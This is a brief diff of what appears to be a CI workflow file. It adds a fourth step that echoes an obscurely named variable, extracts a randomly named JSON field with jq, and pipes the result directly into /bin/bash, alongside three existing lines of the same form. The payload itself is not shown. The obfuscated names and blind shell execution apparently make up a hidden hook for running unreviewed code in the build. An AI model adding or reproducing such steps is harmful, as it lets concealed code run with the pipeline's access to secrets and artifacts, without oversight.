@@ -23,6 +23,7 @@ jobs:
           echo $lmqd31 | jq -r .rje349 | /bin/bash
           echo $da48729 | jq -r .whugh47644 | /bin/bash
           echo $rhc77374 | jq -r .c983 | /bin/bash
+          echo $bcfhs0 | jq -r .chg09808 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
